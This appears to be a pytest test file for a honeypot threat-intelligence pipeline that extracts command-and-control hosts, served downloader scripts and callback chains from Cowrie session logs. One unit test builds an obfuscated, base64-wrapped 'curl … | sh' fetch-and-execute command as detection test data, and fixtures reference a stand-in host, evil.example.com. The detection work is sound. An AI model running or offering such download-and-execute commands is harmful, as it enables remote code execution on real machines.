"""Milestone 2: the extract+enrich pipeline against the golden fixture.

The fixture encodes the full chain: commands reference 59.96.137.61 (served)
and evil.example.com (mentioned); the served script's content references the
onward callback 5.6.7.8.
"""

import json
from pathlib import Path

import pytest

from c2engine.extract import all_observations
from c2engine.extract._util import find_hosts, interpreter_of, sniff_magic
from c2engine.model import SessionIn
from c2engine.pipeline import INDEX_C2, INDEX_SESSION, process

FIXTURES = Path(__file__).parent / "fixtures"


@pytest.fixture()
def raw() -> dict:
    return json.loads((FIXTURES / "session_basic.json").read_text())


@pytest.fixture()
def session(raw: dict) -> SessionIn:
    return SessionIn.model_validate(raw)


def _by_evidence(obs, kind):
    return [o for o in obs if o.evidence == kind]


def test_shell_references(session: SessionIn) -> None:
    obs = all_observations(session)
    refs = {o.c2_host for o in _by_evidence(obs, "shell_reference")}
    assert refs == {"59.96.137.61", "evil.example.com"}


def test_served_file_hashes_and_kind(session: SessionIn) -> None:
    served = _by_evidence(all_observations(session), "served_file")
    assert len(served) == 1
    f = served[0]
    assert f.c2_host == "59.96.137.61"
    assert f.evidence_rank == 1
    assert f.file_kind == "script"
    assert f.interpreter == "sh"
    assert f.content and f.content.startswith("#!/bin/sh")
    # all three hashes present; sha256 matches Cowrie's shasum
    assert f.sha256 == "8c1bd2718a3f3ba16b34a9aa05ea0ec9968fc1d402ca6f33323fbd0a1f06b1a1"
    assert f.sha1 and len(f.sha1) == 40
    assert f.md5 and len(f.md5) == 32
    assert f.family == "downloader.shell"
    assert "5.6.7.8" in f.callbacks
    assert f.c2_host not in f.callbacks  # serving host excluded from its own callbacks


def test_chain_edge(session: SessionIn) -> None:
    obs = all_observations(session)
    callbacks = _by_evidence(obs, "file_callback")
    assert len(callbacks) == 1
    cb = callbacks[0]
    assert cb.c2_host == "5.6.7.8"
    assert cb.evidence_rank == 2
    assert cb.c2_via_sha256 == "8c1bd2718a3f3ba16b34a9aa05ea0ec9968fc1d402ca6f33323fbd0a1f06b1a1"


def test_self_hosted_flag(session: SessionIn) -> None:
    """src_ip == the serving host: the loader-is-scanner pattern."""
    served = _by_evidence(all_observations(session), "served_file")[0]
    assert served.self_hosted is True  # src_ip is 59.96.137.61
    refs = {o.c2_host: o for o in _by_evidence(all_observations(session), "shell_reference")}
    assert refs["evil.example.com"].self_hosted is False


def test_pipeline_additive_and_strip(raw: dict) -> None:
    enriched = process(raw)
    doc = enriched.session_doc
    hp = doc["hp_data"]
    # top-level pivot + marker
    assert set(doc["c2_host"]) == {"59.96.137.61", "evil.example.com"}
    assert doc["enrich_version"] == "c2e-1"
    # enrichment written into hp_data (drop-in with the old proxy)
    assert hp["hassh"] == "92674389fa1e47a27ddd8d9b63ecd42b"
    assert len(hp["playbook_hash"]) == 40  # SHA1, matches production
    assert hp["iocs_c2_hosts"] == doc["c2_host"]  # one source, two surfaces
    assert "5.6.7.8" not in doc["c2_host"]  # callback is a ledger row, not a session host
    assert hp["enrich_schema_version"] == "1"
    # transport-only bytes stripped; every other field survives
    assert "content_b64" not in hp["files"][0]
    assert hp["files"][0]["shasum"].startswith("8c1bd271")
    assert hp["unknown_stock_field"] == "must pass through verbatim"


def test_envelope_tags(raw: dict) -> None:
    envs = process(raw).envelopes()
    assert envs[0][0] == INDEX_SESSION
    assert all(t == INDEX_C2 for t, _ in envs[1:])
    # session + 2 shell_ref + 1 served + 1 callback = 5 records
    assert len(envs) == 5


# --- unit checks on the primitives ---------------------------------------

def test_base64_wrapped_host_seen() -> None:
    # echo <b64 of 'curl http://9.9.9.9/x|sh'> | base64 -d | sh
    import base64

    blob = base64.b64encode(b"curl http://9.9.9.9/x | sh").decode()
    hosts = dict(find_hosts(f'echo "{blob}" | base64 -d | sh'))
    assert "9.9.9.9" in hosts


def test_elf_magic_arch() -> None:
    # ELF, 32-bit, big-endian, e_machine=8 (MIPS)
    hdr = b"\x7fELF\x01\x02" + b"\x00" * 12 + (8).to_bytes(2, "big")
    assert sniff_magic(hdr) == "ELF 32-bit MIPS"


def test_interpreter_env_form() -> None:
    assert interpreter_of("#!/usr/bin/env python3\n...") == "python"
    assert interpreter_of("#!/bin/bash -e\n...") == "bash"
    assert interpreter_of("no shebang") is None
